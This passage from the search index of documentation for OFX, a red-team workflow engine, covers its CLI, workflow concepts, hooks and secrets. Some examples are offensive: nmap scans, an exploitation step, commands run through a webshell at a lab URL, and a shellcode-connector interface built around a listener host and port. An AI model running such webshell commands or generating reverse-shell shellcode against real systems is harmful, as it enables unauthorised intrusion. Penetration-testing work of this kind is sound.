</ul>"},{"location":"cli/commands/visualize/#examples","title":"Examples","text":""},{"location":"cli/commands/visualize/#basic-visualization","title":"Basic visualization","text":"<pre><code>ofx flow visualize scan-workflow.yaml\n</code></pre>"},{"location":"cli/commands/visualize/#export-to-graphviz-dot-format","title":"Export to GraphViz DOT format","text":"<pre><code>ofx flow visualize attack-chain --format dot --output workflow.dot\n</code></pre>"},{"location":"cli/commands/visualize/#detailed-view","title":"Detailed view","text":"<pre><code>ofx flow visualize complex-workflow --detailed\n</code></pre>"},{"location":"cli/commands/visualize/#visualization-output","title":"Visualization Output","text":"<p>The terminal visualization shows:</p> <ol> <li>Workflow Overview</li> <li>Name, description</li> <li>Total jobs, execution stages</li> <li> <p>Est. parallel efficiency</p> </li> <li> <p>Workflow Statistics</p> </li> <li>Job count, stage count</li> <li>Dependencies, outputs</li> <li> <p>Hooks, conditionals</p> </li> <li> <p>Dependency Graph</p> </li> <li>ASCII art representation</li> <li>Job boxes with dependencies</li> <li>Stage grouping</li> <li> <p>Edge connections</p> </li> <li> <p>Job Specifications</p> </li> <li>Detailed job information</li> <li>Steps, dependencies</li> <li>Outputs, hooks</li> </ol>"},{"location":"cli/commands/visualize/#graph-formats","title":"Graph Formats","text":""},{"location":"cli/commands/visualize/#terminal-default","title":"Terminal (Default)","text":"<p>ASCII art graph displayed in terminal with colors and formatting.</p>"},{"location":"cli/commands/visualize/#dot-format","title":"DOT Format","text":"<p>GraphViz DOT language for rendering with <code>dot</code> command:</p> <pre><code>ofx flow visualize workflow.yaml --format dot --output graph.dot\ndot -Tpng graph.dot -o graph.png\n</code></pre>"},{"location":"cli/commands/visualize/#json-format","title":"JSON Format","text":"<p>Machine-readable JSON structure:</p> <pre><code>{\n  \"stages\": [[...]],\n  \"dependencies\": {...},\n  \"jobs\": {...}\n}\n</code></pre>"},{"location":"cli/commands/visualize/#see-also","title":"See Also","text":"<ul> <li>flow run</li> <li>flow validate</li> <li>Workflow Dependencies</li> </ul>"},{"location":"getting-started/concepts/","title":"Basic Concepts","text":"<p>Understanding OFX core concepts helps you build powerful workflows efficiently.</p>"},{"location":"getting-started/concepts/#workflow","title":"Workflow","text":"<p>A workflow is the top-level container that defines a complete automation process.</p>"},{"location":"getting-started/concepts/#structure","title":"Structure","text":"<pre><code>name: workflow-name\ndescription: Workflow description\n\ninputs:\n  # Input parameters\n\nsecrets:\n  # Required secrets\n\njobs:\n  # Job definitions\n\nhooks:\n  # Lifecycle hooks\n</code></pre>"},{"location":"getting-started/concepts/#key-properties","title":"Key Properties","text":"<ul> <li>name - Unique identifier (required)</li> <li>description - Human-readable description</li> <li>inputs - User-provided parameters</li> <li>secrets - Sensitive configuration</li> <li>jobs - Execution units</li> <li>hooks - Lifecycle callbacks</li> </ul>"},{"location":"getting-started/concepts/#job","title":"Job","text":"<p>A job is an independent unit of work within a workflow.</p>"},{"location":"getting-started/concepts/#characteristics","title":"Characteristics","text":"<ul> <li>Jobs run sequentially by default</li> <li>Can have dependencies (run after other jobs)</li> <li>Contain steps that execute in order</li> <li>Can define their own hooks and environment</li> </ul>"},{"location":"getting-started/concepts/#example","title":"Example","text":"<pre><code>jobs:\n  recon:\n    name: Reconnaissance\n    steps:\n      - name: Scan ports\n        run: nmap -p- ${{ inputs.target }}\n\n  exploit:\n    name: Exploitation\n    needs: [recon]  # Runs after recon\n    steps:\n      - name: Launch exploit\n        run: python exploit.py\n</code></pre>"},{"location":"getting-started/concepts/#step","title":"Step","text":"<p>A step is the smallest unit of execution within a job.</p>"},{"location":"getting-started/concepts/#types-of-steps","title":"Types of Steps","text":"<ol> <li> <p>Shell Command (default) <pre><code>- name: Run command\n  run: echo \"Hello\"\n</code></pre></p> </li> <li> <p>Python Script <pre><code>- name: Python code\n  script:\n  script: |\n    print(\"Hello from Python\")\n</code></pre></p> </li> <li> <p>Bash Script <pre><code>- name: Bash script\n  language: bash\n  script: |\n    #!/bin/bash\n    echo \"Hello from Bash\"\n</code></pre></p> </li> </ol>"},{"location":"getting-started/concepts/#step-properties","title":"Step Properties","text":"<ul> <li>name - Step description</li> <li>run - Shell command (for shell steps)</li> <li>script - Code content (for script steps)</li> <li>language - Script language (python, bash, etc.)</li> <li>timeout - Maximum execution time</li> <li>retry - Retry configuration</li> <li>continue_on_error - Don't fail job on error</li> </ul>"},{"location":"getting-started/concepts/#inputs","title":"Inputs","text":"<p>Inputs are parameters passed to workflows at runtime.</p>"},{"location":"getting-started/concepts/#definition","title":"Definition","text":"<pre><code>inputs:\n  target:\n    description: Target host or IP\n    required: true\n    default: \"127.0.0.1\"\n\n  ports:\n    description: Ports to scan\n    required: false\n    default: \"80,443\"\n</code></pre>"},{"location":"getting-started/concepts/#usage","title":"Usage","text":"<p>In workflow: <pre><code>steps:\n  - run: nmap -p ${{ inputs.ports }} ${{ inputs.target }}\n</code></pre></p> <p>From CLI: <pre><code>ofx flow run scan --input target=example.com --input ports=22,80,443\n</code></pre></p>"},{"location":"getting-started/concepts/#input-properties","title":"Input Properties","text":"<ul> <li>description - Help text</li> <li>required - Must be provided</li> <li>default - Fallback value</li> <li>type - Data type (string, number, boolean)</li> </ul>"},{"location":"getting-started/concepts/#secrets","title":"Secrets","text":"<p>Secrets are encrypted sensitive data (API keys, passwords, tokens).</p>"},{"location":"getting-started/concepts/#definition_1","title":"Definition","text":"<pre><code>secrets:\n  api_key:\n    description: API authentication key\n    required: true\n\n  password:\n    description: Admin password\n    required: false\n</code></pre>"},{"location":"getting-started/concepts/#usage_1","title":"Usage","text":"<p>Store secret: <pre><code>ofx secret set API_KEY\n# Enter value when prompted\n</code></pre></p> <p>In workflow: <pre><code>steps:\n  - run: curl -H \"Authorization: Bearer ${{ secrets.api_key }}\"\n</code></pre></p>"},{"location":"getting-started/concepts/#secret-properties","title":"Secret Properties","text":"<ul> <li>Stored in encrypted file (~/.config/ofx/secrets.enc)</li> <li>Never logged or displayed</li> <li>Automatically loaded from secret store</li> <li>Can be provided via environment variables</li> </ul>"},{"location":"getting-started/concepts/#hooks","title":"Hooks","text":"<p>Hooks are callbacks that execute at specific lifecycle events.</p>"},{"location":"getting-started/concepts/#hook-types","title":"Hook Types","text":"<ol> <li> <p>Status Hooks <pre><code>hooks:\n  on_start:\n    - run: echo \"Starting...\"\n\n  on_success:\n    - run: echo \"Success!\"\n\n  on_failure:\n    - run: echo \"Failed!\"\n</code></pre></p> </li> <li> <p>Lifecycle Hooks <pre><code>hooks:\n  before_jobs:\n    - run: echo \"Before jobs\"\n\n  after_jobs:\n    - run: echo \"After jobs\"\n</code></pre></p> </li> <li> <p>Command Hooks <pre><code>hooks:\n  before_command:\n    - run: echo \"Before each command\"\n\n  after_command:\n    - run: echo \"After each command\"\n</code></pre></p> </li> </ol>"},{"location":"getting-started/concepts/#hook-scopes","title":"Hook Scopes","text":"<p>Hooks can be defined at:</p> <ol> <li>Workflow level - Affect entire workflow</li> <li>Job level - Affect specific job</li> <li>Step level - Affect specific step</li> </ol>"},{"location":"getting-started/concepts/#hook-propagation","title":"Hook Propagation","text":"<p>Hooks propagate from parent to child:</p> <pre><code>Workflow hooks\n    \u2193\nJob hooks (inherit + add)\n    \u2193\nStep hooks (inherit + add)\n</code></pre> <p>Example: <pre><code>hooks:\n  on_start:\n    - run: echo \"Workflow start\"  # Runs once\n\njobs:\n  job1:\n    hooks:\n      on_start:\n        - run: echo \"Job1 start\"  # Runs at job start\n    steps:\n      - name: Step 1\n        run: echo \"Doing work\"\n</code></pre></p> <p>See Hooks Guide for more details.</p>"},{"location":"getting-started/concepts/#templates","title":"Templates","text":"<p>Templates enable dynamic configuration using Jinja2 syntax.</p>"},{"location":"getting-started/concepts/#template-syntax","title":"Template Syntax","text":"<pre><code>${{ expression }}\n</code></pre>"},{"location":"getting-started/concepts/#available-variables","title":"Available Variables","text":"<ol> <li> <p>inputs - User inputs <pre><code>${{ inputs.target }}\n</code></pre></p> </li> <li> <p>secrets - Secret values <pre><code>${{ secrets.api_key }}\n</code></pre></p> </li> <li> <p>ctx - Context variables <pre><code>${{ ctx.workflow.name }}\n${{ ctx.job.name }}\n${{ ctx.step.name }}\n</code></pre></p> </li> </ol>"},{"location":"getting-started/concepts/#built-in-functions","title":"Built-in Functions","text":"<p>Tool Installation: <pre><code>- run: ${{ uv_install('requests') }}\n- run: ${{ pip_install('numpy') }}\n- run: ${{ go_install('github.com/projectdiscovery/subfinder') }}\n- run: ${{ npm_install('wappalyzer') }}\n</code></pre></p> <p>Path Operations: <pre><code>- run: ${{ output_path('results.txt') }}\n- run: ${{ workflow_path() }}\n</code></pre></p>"},{"location":"getting-started/concepts/#template-examples","title":"Template Examples","text":"<p>Conditional execution: <pre><code>steps:\n  - name: Debug mode\n    run: |\n      {% if inputs.debug %}\n      echo \"Debug enabled\"\n      {% endif %}\n</code></pre></p> <p>Loops: <pre><code>steps:\n  - name: Scan multiple targets\n    run: |\n      {% for target in inputs.targets.split(',') %}\n      nmap {{ target }}\n      {% endfor %}\n</code></pre></p> <p>See Templates Guide for more details.</p>"},{"location":"getting-started/concepts/#template-resolution","title":"Template Resolution","text":"<p>Templates are resolved before execution in this order:</p> <ol> <li>Workflow level - Inputs, secrets loaded</li> <li>Job level - Job context available</li> <li>Step level - Full context available</li> </ol> <p>Example:</p> <pre><code>inputs:\n  target: \"example.com\"\n\njobs:\n  scan:\n    envs:\n      TARGET: ${{ inputs.target }}  # Resolved to \"example.com\"\n    steps:\n      - name: Scan\n        run: nmap $TARGET  # Uses resolved env var\n</code></pre>"},{"location":"getting-started/concepts/#dependencies","title":"Dependencies","text":"<p>Jobs can depend on other jobs using <code>needs</code>:</p>"},{"location":"getting-started/concepts/#simple-dependency","title":"Simple Dependency","text":"<pre><code>jobs:\n  job1:\n    steps:\n      - run: echo \"First\"\n\n  job2:\n    needs: [job1]  # Waits for job1\n    steps:\n      - run: echo \"Second\"\n</code></pre>"},{"location":"getting-started/concepts/#multiple-dependencies","title":"Multiple Dependencies","text":"<pre><code>jobs:\n  recon:\n    steps:\n      - run: echo \"Recon\"\n\n  scan:\n    steps:\n      - run: echo \"Scan\"\n\n  analyze:\n    needs: [recon, scan]  # Waits for both\n    steps:\n      - run: echo \"Analyze\"\n</code></pre>"},{"location":"getting-started/concepts/#execution-flow","title":"Execution Flow","text":"<pre><code>recon \u2500\u2510\n       \u251c\u2500\u2192 analyze\nscan \u2500\u2500\u2518\n</code></pre> <p>Jobs <code>recon</code> and <code>scan</code> run in parallel (if possible), then <code>analyze</code> runs.</p>"},{"location":"getting-started/concepts/#environment-variables","title":"Environment Variables","text":"<p>Define environment variables at different levels:</p>"},{"location":"getting-started/concepts/#workflow-level","title":"Workflow Level","text":"<pre><code>envs:\n  GLOBAL_VAR: \"value\"\n\njobs:\n  job1:\n    steps:\n      - run: echo $GLOBAL_VAR  # Available\n</code></pre>"},{"location":"getting-started/concepts/#job-level","title":"Job Level","text":"<pre><code>jobs:\n  job1:\n    envs:\n      JOB_VAR: \"value\"\n    steps:\n      - run: echo $JOB_VAR  # Available\n</code></pre>"},{"location":"getting-started/concepts/#step-level","title":"Step Level","text":"<pre><code>steps:\n  - name: With env\n    envs:\n      STEP_VAR: \"value\"\n    run: echo $STEP_VAR\n</code></pre>"},{"location":"getting-started/concepts/#error-handling","title":"Error Handling","text":"<p>Control error behavior at different levels:</p>"},{"location":"getting-started/concepts/#continue-on-error","title":"Continue on Error","text":"<pre><code>jobs:\n  resilient:\n    continue_on_error: true  # Job continues even if step fails\n    steps:\n      - run: false  # Fails but job continues\n      - run: echo \"Still runs\"\n</code></pre>"},{"location":"getting-started/concepts/#retry-configuration","title":"Retry Configuration","text":"<pre><code>steps:\n  - name: Flaky command\n    retry:\n      max_attempts: 3\n      delay: 5  # seconds\n    run: curl https://api.example.com\n</code></pre>"},{"location":"getting-started/concepts/#timeout","title":"Timeout","text":"<pre><code>steps:\n  - name: Long task\n    timeout: 300  # 5 minutes\n    run: long-running-command\n</code></pre>"},{"location":"getting-started/concepts/#output-management","title":"Output Management","text":"<p>Control where outputs are saved:</p>"},{"location":"getting-started/concepts/#output-directory","title":"Output Directory","text":"<pre><code># Set at workflow level\noutput_dir: \"./results\"\n\njobs:\n  scan:\n    steps:\n      - run: nmap -oN output.txt ${{ inputs.target }}\n        # Saves to ./results/output.txt\n</code></pre>"},{"location":"getting-started/concepts/#custom-output-path","title":"Custom Output Path","text":"<pre><code># From CLI\nofx flow run scan --output /tmp/scan-results\n</code></pre>"},{"location":"getting-started/concepts/#accessing-outputs","title":"Accessing Outputs","text":"<pre><code>steps:\n  - name: Save results\n    run: echo \"Results\" &gt; ${{ output_path('data.txt') }}\n\n  - name: Read results\n    run: cat ${{ output_path('data.txt') }}\n</code></pre>"},{"location":"getting-started/concepts/#context-variables","title":"Context Variables","text":"<p>Access runtime information via <code>ctx</code>:</p>"},{"location":"getting-started/concepts/#workflow-context","title":"Workflow Context","text":"<pre><code>${{ ctx.workflow.name }}        # Workflow name\n${{ ctx.workflow.description }} # Description\n</code></pre>"},{"location":"getting-started/concepts/#job-context","title":"Job Context","text":"<pre><code>${{ ctx.job.name }}             # Current job name\n${{ ctx.job.id }}               # Job ID\n</code></pre>"},{"location":"getting-started/concepts/#step-context","title":"Step Context","text":"<pre><code>${{ ctx.step.name }}            # Current step name\n${{ ctx.step.index }}           # Step number\n</code></pre>"},{"location":"getting-started/concepts/#system-context","title":"System Context","text":"<pre><code>${{ ctx.system.os }}            # Operating system\n${{ ctx.system.arch }}          # Architecture\n${{ ctx.system.user }}          # Current user\n</code></pre>"},{"location":"getting-started/concepts/#best-practices","title":"Best Practices","text":""},{"location":"getting-started/concepts/#1-use-descriptive-names","title":"1. Use Descriptive Names","text":"<p>Good: <pre><code>name: comprehensive-web-app-security-scan\njobs:\n  subdomain-enumeration:\n    steps:\n      - name: Run subfinder for subdomain discovery\n</code></pre></p> <p>Bad: <pre><code>name: scan\njobs:\n  job1:\n    steps:\n      - name: step1\n</code></pre></p>"},{"location":"getting-started/concepts/#2-validate-inputs","title":"2. Validate Inputs","text":"<pre><code>inputs:\n  target:\n    description: Target domain (e.g., example.com)\n    required: true\n\n  timeout:\n    description: Scan timeout in seconds\n    default: 300\n</code></pre>"},{"location":"getting-started/concepts/#3-use-hooks-for-logging","title":"3. Use Hooks for Logging","text":"<pre><code>hooks:\n  on_start:\n    - run: echo \"=== Scan started at $(date) ===\"\n  on_success:\n    - run: echo \"=== Scan completed at $(date) ===\"\n  on_failure:\n    - run: echo \"=== Scan failed at $(date) ===\" &gt;&amp;2\n</code></pre>"},{"location":"getting-started/concepts/#4-organize-with-dependencies","title":"4. Organize with Dependencies","text":"<pre><code>jobs:\n  setup:\n    steps:\n      - run: mkdir -p results\n\n  scan:\n    needs: [setup]\n    steps:\n      - run: nmap -oN results/nmap.txt target\n\n  cleanup:\n    needs: [scan]\n    steps:\n      - run: tar -czf results.tar.gz results/\n</code></pre>"},{"location":"getting-started/concepts/#5-handle-errors-gracefully","title":"5. Handle Errors Gracefully","text":"<pre><code>steps:\n  - name: Optional step\n    continue_on_error: true\n    run: experimental-tool\n\n  - name: Critical step\n    retry:\n      max_attempts: 3\n    run: important-command\n</code></pre>"},{"location":"getting-started/concepts/#next-steps","title":"Next Steps","text":"<ul> <li>Workflows - Comprehensive workflow guide</li> <li>Jobs &amp; Steps - Job and step configuration</li> <li>Hooks - Hook system deep dive</li> <li>Templates - Template syntax and functions</li> <li>API Overview - Red teaming APIs</li> </ul>"},{"location":"getting-started/quickstart/","title":"Quick Start","text":"<p>Get started with OFX workflows in under 5 minutes.</p>"},{"location":"getting-started/quickstart/#your-first-workflow","title":"Your First Workflow","text":""},{"location":"getting-started/quickstart/#1-initialize-a-project","title":"1. Initialize a Project","text":"<pre><code># Create a new project\nofx project init quickstart-demo\n\n# Navigate to project directory\ncd ~/.local/share/ofx/projects/quickstart-demo\n</code></pre>"},{"location":"getting-started/quickstart/#2-create-a-simple-workflow","title":"2. Create a Simple Workflow","text":"<p>Create a file named <code>hello.yml</code> in <code>~/.config/ofx/workflows/</code>:</p> <pre><code>name: hello-world\ndescription: My first OFX workflow\n\njobs:\n  greet:\n    name: Say Hello\n    steps:\n      - name: Print greeting\n        run: echo \"Hello from OFX!\"\n\n      - name: Show date\n        run: date\n\n      - name: List files\n        run: ls -lah\n\n  analyze:\n    name: System Info\n    needs: [greet]\n    steps:\n      - name: Python version\n        run: python3 --version\n\n      - name: Current directory\n        run: pwd\n</code></pre>"},{"location":"getting-started/quickstart/#3-validate-the-workflow","title":"3. Validate the Workflow","text":"<pre><code>ofx flow validate hello-world\n</code></pre> <p>Expected output: <pre><code>\u2713 Workflow 'hello-world' is valid\n</code></pre></p>"},{"location":"getting-started/quickstart/#4-run-the-workflow","title":"4. Run the Workflow","text":"<pre><code>ofx flow run hello-world\n</code></pre> <p>You'll see: - Job execution progress - Real-time step output - Success indicators</p>"},{"location":"getting-started/quickstart/#adding-inputs","title":"Adding Inputs","text":"<p>Create <code>scan.yml</code> with inputs:</p> <pre><code>name: port-scanner\ndescription: Simple port scanner\n\ninputs:\n  target:\n    description: Target IP or hostname\n    required: true\n\n  ports:\n    description: Ports to scan\n    default: \"80,443,8080\"\n\njobs:\n  scan:\n    name: Port Scan\n    steps:\n      - name: Install nmap\n        run: ${{ uv_install('nmap-python') }}\n\n      - name: Scan ports\n        run: |\n          echo \"Scanning ${{ inputs.target }}\"\n          echo \"Ports: ${{ inputs.ports }}\"\n          nmap -p ${{ inputs.ports }} ${{ inputs.target }}\n</code></pre> <p>Run with inputs:</p> <pre><code>ofx flow run port-scanner \\\n  --input target=scanme.nmap.org \\\n  --input ports=22,80,443\n</code></pre>"},{"location":"getting-started/quickstart/#using-secrets","title":"Using Secrets","text":""},{"location":"getting-started/quickstart/#1-store-a-secret","title":"1. Store a Secret","text":"<pre><code>ofx secret set API_KEY\n# Enter value when prompted (input hidden)\n</code></pre>"},{"location":"getting-started/quickstart/#2-use-in-workflow","title":"2. Use in Workflow","text":"<p>Create <code>api-call.yml</code>:</p> <pre><code>name: api-test\ndescription: Test API with secret\n\nsecrets:\n  api_key:\n    description: API authentication key\n    required: true\n\njobs:\n  call-api:\n    name: Call API\n    steps:\n      - name: Make request\n        run: |\n          curl -H \"Authorization: Bearer ${{ secrets.api_key }}\" \\\n            https://api.example.com/data\n</code></pre> <p>Run:</p> <pre><code>ofx flow run api-test\n# OFX automatically loads API_KEY from secret store\n</code></pre>"},{"location":"getting-started/quickstart/#using-ofx-apis","title":"Using OFX APIs","text":"<p>Create <code>webshell.yml</code> using OFX APIs:</p> <pre><code>name: webshell-demo\ndescription: WebShell API demonstration\n\ninputs:\n  url:\n    description: WebShell URL\n    required: true\n\n  param:\n    description: Command parameter\n    default: \"cmd\"\n\njobs:\n  exploit:\n    name: WebShell Exploitation\n    steps:\n      - name: Execute command\n        script: |\n          from ofx.api import webshell\n\n          shell = webshell.WebShell(\n              url=\"${{ inputs.url }}\",\n              param=\"${{ inputs.param }}\"\n          )\n\n          # List directory\n          result = shell.execute(\"ls -la\")\n          print(result)\n\n          # Check user\n          whoami = shell.execute(\"whoami\")\n          print(f\"Current user: {whoami}\")\n</code></pre> <p>Run:</p> <pre><code>ofx flow run webshell-demo \\\n  --input url=http://vulnerable.lab/shell.php \\\n  --input param=cmd\n</code></pre>"},{"location":"getting-started/quickstart/#multi-job-workflows","title":"Multi-Job Workflows","text":"<p>Create <code>recon.yml</code> with dependencies:</p> <pre><code>name: basic-recon\ndescription: Basic reconnaissance workflow\n\ninputs:\n  domain:\n    description: Target domain\n    required: true\n\njobs:\n  subdomain-enum:\n    name: Enumerate Subdomains\n    steps:\n      - name: Run subfinder\n        run: |\n          subfinder -d ${{ inputs.domain }} -o subdomains.txt\n          cat subdomains.txt\n\n  port-scan:\n    name: Scan Discovered Hosts\n    needs: [subdomain-enum]\n    steps:\n      - name: Run nmap\n        run: |\n          nmap -iL subdomains.txt -p 80,443,8080 -oN nmap-results.txt\n\n  analyze:\n    name: Analyze Results\n    needs: [subdomain-enum, port-scan]\n    steps:\n      - name: Summary\n        run: |\n          echo \"=== Reconnaissance Summary ===\"\n          echo \"Subdomains found: $(wc -l &lt; subdomains.txt)\"\n          echo \"Nmap results:\"\n          cat nmap-results.txt\n</code></pre> <p>Run:</p> <pre><code>ofx flow run basic-recon --input domain=example.com\n</code></pre> <p>Jobs execute in order: subdomain-enum \u2192 port-scan \u2192 analyze</p>"},{"location":"getting-started/quickstart/#using-hooks","title":"Using Hooks","text":"<p>Add lifecycle hooks to <code>scan.yml</code>:</p> <pre><code>name: scan-with-hooks\ndescription: Workflow with hooks\n\ninputs:\n  target:\n    required: true\n\nhooks:\n  on_start:\n    - name: Notify start\n      run: echo \"\ud83d\ude80 Starting scan of ${{ inputs.target }}\"\n\n  on_success:\n    - name: Notify success\n      run: echo \"\u2705 Scan completed successfully!\"\n\n  on_failure:\n    - name: Notify failure\n      run: echo \"\u274c Scan failed!\"\n\njobs:\n  scan:\n    name: Scan Target\n    hooks:\n      on_start:\n        - run: echo \"Starting job: scan\"\n    steps:\n      - name: Run scan\n        run: nmap -sV ${{ inputs.target }}\n</code></pre> <p>Hooks execute at different lifecycle stages: - Workflow start/end - Job start/end - Step start/end</p>"},{"location":"getting-started/quickstart/#viewing-documentation","title":"Viewing Documentation","text":""},{"location":"getting-started/quickstart/#web-documentation","title":"Web Documentation","text":"<pre><code># Start docs server\nofx docs serve\n\n# Open browser to http://localhost:8000\n</code></pre>"},{"location":"getting-started/quickstart/#api-documentation","title":"API Documentation","text":"<pre><code># List all API modules\nofx docs api --list\n\n# View module details\nofx docs api --module http\n\n# View specific function\nofx docs api --module webshell --function WebShell.execute\n</code></pre>"},{"location":"getting-started/quickstart/#check-system-health","title":"Check System Health","text":"<pre><code># Run comprehensive health check\nofx doctor\n</code></pre> <p>Output shows: - \u2713 Installed tools - \u2717 Missing tools - Installation suggestions</p>"},{"location":"getting-started/quickstart/#common-commands","title":"Common Commands","text":"<pre><code># List secrets\nofx secret list\n\n# Validate workflow\nofx flow validate &lt;workflow-name&gt;\n\n# Run workflow\nofx flow run &lt;workflow-name&gt;\n\n# Run with alias\nofx x run &lt;workflow-name&gt;\n\n# Install workflow tools\nofx flow tools &lt;workflow-name&gt;\n\n# Dump workflow schema\nofx dump schema\n</code></pre>"},{"location":"getting-started/quickstart/#next-steps","title":"Next Steps","text":"<p>Now that you understand the basics:</p> <ol> <li>Learn Concepts - Read Basic Concepts</li> <li>Explore Workflows - Check Workflow Guide</li> <li>Use APIs - Read API Overview</li> <li>Master CLI - See CLI Commands</li> <li>Advanced Topics - Review Performance Guide</li> </ol>"},{"location":"getting-started/concepts/","title":"Concepts","text":"<p>Overview of core concepts in OFX.</p> <ul> <li>Architecture</li> </ul>"},{"location":"getting-started/concepts/architecture/","title":"Architecture","text":"<p>OFX is designed as a modular, extensible workflow engine for red teaming, automation, and DevSecOps. It separates workflow logic, job execution, API modules, and utilities for maximum flexibility.</p>"},{"location":"getting-started/concepts/architecture/#core-components","title":"Core Components","text":"<ul> <li>Workflow Engine: Parses YAML, resolves templates, manages execution</li> <li>Job Runner: Handles parallel and sequential job execution</li> <li>Step Runner: Executes commands, scripts, or code blocks</li> <li>API Modules: Provide reusable functions for recon, exploitation, post-exploitation</li> <li>Hooks System: Injects custom logic at workflow, job, or step level</li> <li>Template Engine: Uses Jinja2 for dynamic variables and logic</li> </ul>"},{"location":"getting-started/concepts/architecture/#execution-flow","title":"Execution Flow","text":"<ol> <li>Load workflow YAML</li> <li>Resolve templates with inputs/secrets</li> <li>Execute jobs (respecting dependencies)</li> <li>Run steps within each job</li> <li>Trigger hooks at each lifecycle stage</li> <li>Collect outputs and results</li> </ol>"},{"location":"getting-started/concepts/architecture/#extending-ofx","title":"Extending OFX","text":"<ul> <li>Add new API modules in <code>src/ofx/api/</code></li> <li>Add custom connectors for new data sources</li> <li>Use hooks and templates for advanced logic</li> </ul>"},{"location":"getting-started/concepts/architecture/#see-also","title":"See Also","text":"<ul> <li>Quickstart Guide</li> <li>Workflow Syntax</li> </ul>"},{"location":"getting-started/quickstart/","title":"Quickstart","text":"<p>Quickstart guide for OFX.</p> <ul> <li>Examples</li> </ul>"},{"location":"getting-started/quickstart/examples/","title":"Quickstart Examples","text":"<p>Here are simple OFX workflow examples to get you started quickly.</p>"},{"location":"getting-started/quickstart/examples/#example-1-hello-world","title":"Example 1: Hello World","text":"<pre><code>name: Hello World\njobs:\n    hello:\n        steps:\n            - run: echo \"Hello, OFX!\"\n</code></pre>"},{"location":"getting-started/quickstart/examples/#example-2-scan-a-target","title":"Example 2: Scan a Target","text":"<pre><code>name: Scan Target\ninputs:\n    target: \"localhost\"\njobs:\n    scan:\n        steps:\n            - run: nmap {{ inputs.target }}\n</code></pre>"},{"location":"getting-started/quickstart/examples/#example-3-use-a-secret","title":"Example 3: Use a Secret","text":"<pre><code>jobs:\n    api:\n        steps:\n            - run: curl -H \"Authorization: Bearer {{ secrets.API_KEY }}\" https://api.example.com\n</code></pre>"},{"location":"getting-started/quickstart/examples/#see-also","title":"See Also","text":"<ul> <li>Quickstart Guide</li> </ul>"},{"location":"guide/extending-data-modules/","title":"Extending Data Modules","text":"<p>OFX provides extensible data modules for shellcode and webshell generation. This guide explains how to create custom connectors and find the data directories.</p>"},{"location":"guide/extending-data-modules/#overview","title":"Overview","text":"<p>The data directory contains:</p> <ul> <li>shellcode/: Binary shellcode payloads and connectors</li> <li>webshell/: Webshell templates, generators, and connectors  </li> <li>site/: Static documentation site files</li> </ul>"},{"location":"guide/extending-data-modules/#finding-data-directories","title":"Finding Data Directories","text":""},{"location":"guide/extending-data-modules/#programmatic-access","title":"Programmatic Access","text":"<p>OFX exposes the data directory location through settings:</p> <pre><code>from ofx.settings import DATA_DIR\n\n# Get the main data directory\nprint(f\"Data directory: {DATA_DIR}\")\n\n# Access specific subdirectories\nshellcode_dir = DATA_DIR / \"shellcode\"\nwebshell_dir = DATA_DIR / \"webshell\"\n</code></pre>"},{"location":"guide/extending-data-modules/#file-system-location","title":"File System Location","text":"<p>The data directory is located within the installed package:</p> <pre><code># Find the installation location\npython -c \"import ofx; from pathlib import Path; print(Path(ofx.__file__).parent / 'data')\"\n\n# Typical locations:\n# - Virtual env: ~/.venv/lib/python3.12/site-packages/ofx/data\n# - User install: ~/.local/lib/python3.12/site-packages/ofx/data\n# - System: /usr/lib/python3.12/site-packages/ofx/data\n# - Development: /path/to/ofx/src/ofx/data\n</code></pre>"},{"location":"guide/extending-data-modules/#cli-helper","title":"CLI Helper","text":"<p>Use the Python settings to locate directories:</p> <pre><code># Show data directory location\npython -c \"from ofx.settings import DATA_DIR; print(DATA_DIR)\"\n\n# List shellcode connectors\npython -c \"from ofx.settings import DATA_DIR; print(list((DATA_DIR / 'shellcode/connectors').glob('*.py')))\"\n\n# List webshell generators\npython -c \"from ofx.settings import DATA_DIR; print(list((DATA_DIR / 'webshell/generators').glob('*.py')))\"\n</code></pre>"},{"location":"guide/extending-data-modules/#extending-shellcode-connectors","title":"Extending Shellcode Connectors","text":""},{"location":"guide/extending-data-modules/#base-connector-interface","title":"Base Connector Interface","text":"<p>All shellcode connectors inherit from <code>ShellcodeConnector</code>:</p> <pre><code>from abc import ABC, abstractmethod\nfrom typing import Optional\n\nclass ShellcodeConnector(ABC):\n    \"\"\"Abstract base class for shellcode generation connectors.\"\"\"\n\n    def __init__(self, name: str, description: str = \"\"):\n        self.name = name\n        self.description = description\n        self.available = self.check_available()\n\n    @abstractmethod\n    def generate(\n        self,\n        arch: str,\n        format: str,\n        lhost: Optional[str] = None,\n        lport: Optional[int] = None,\n        **kwargs\n    ) -&gt; bytes:\n        \"\"\"Generate shellcode bytes.\n\n        Args:\n            arch: Target architecture (x86, x64, arm, etc.)\n            format: Output format (raw, hex, base64, etc.)\n            lhost: Listener host IP\n            lport: Listener port\n            **kwargs: Additional connector-specific parameters\n\n        Returns:\n            Generated shellcode as bytes\n        \"\"\"\n        pass\n\n    def check_available(self) -&gt; bool:\n        \"\"\"Check if connector dependencies are available.\"\"\"\n        return True\n\n    def validate_params(self, arch: str, format: str) -&gt; None:\n        \"\"\"Validate generation parameters.\"\"\"\n        pass\n</code></pre>"},{"location":"guide/extending-data-modules/#creating-a-custom-connector","title":"Creating a Custom Connector","text":"<p>Create a new file in <code>data/shellcode/connectors/</code>:</p> <pre><code># src/ofx/data/shellcode/connectors/custom_connector.py\n\nfrom typing import Optional\nfrom ofx.data.shellcode.connectors.base import ShellcodeConnector\nimport subprocess\nimport shutil\n\nclass CustomShellcodeConnector(ShellcodeConnector):\n    \"\"\"Custom shellcode connector using external tool.\"\"\"\n\n    def __init__(self):\n        super().__init__(\n            name=\"custom-tool\",\n            description=\"Generate shellcode using custom tool\"\n        )\n\n    def check_available(self) -&gt; bool:\n        \"\"\"Check if custom tool is installed.\"\"\"\n        return shutil.which(\"custom-tool\") is not None\n\n    def generate(\n        self,\n        arch: str,\n        format: str = \"raw\",\n        lhost: Optional[str] = None,\n        lport: Optional[int] = None,\n        **kwargs\n    ) -&gt; bytes:\n        \"\"\"Generate shellcode using custom tool.\"\"\"\n\n        self.validate_params(arch, format)\n\n        # Build command\n        cmd = [\"custom-tool\", \"-a\", arch]\n\n        if lhost and lport:\n            cmd.extend([\"-l\", f\"{lhost}:{lport}\"])\n\n        if format:\n            cmd.extend([\"-f\", format])\n\n        # Execute and capture output\n        result = subprocess.run(\n            cmd,\n            capture_output=True,\n            check=True\n        )\n\n        return result.stdout\n\n    def validate_params(self, arch: str, format: str) -&gt; None:\n        \"\"\"Validate parameters.\"\"\"\n        valid_archs = [\"x86\", \"x64\", \"arm\", \"arm64\"]\n        if arch not in 